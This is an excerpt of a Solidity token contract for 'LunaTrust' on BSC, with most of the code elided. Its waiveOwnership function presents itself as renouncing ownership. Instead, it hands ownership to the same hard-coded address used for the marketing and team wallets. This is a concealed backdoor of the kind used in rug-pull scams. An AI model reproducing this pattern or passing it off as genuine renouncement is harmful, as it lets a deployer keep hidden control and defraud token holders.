...
/**
Telegram : https://t.me/LunaTrustBSC
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x84B281eA0dea84933b20a695b9AEce9D0f60e6FD);
    }
...
contract LunaTrust is Context, IERC20, Ownable {
    ...
    string private _symbol = "LUNCT???";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x84B281eA0dea84933b20a695b9AEce9D0f60e6FD);
    address payable private teamWalletAddress = payable(0x84B281eA0dea84933b20a695b9AEce9D0f60e6FD);
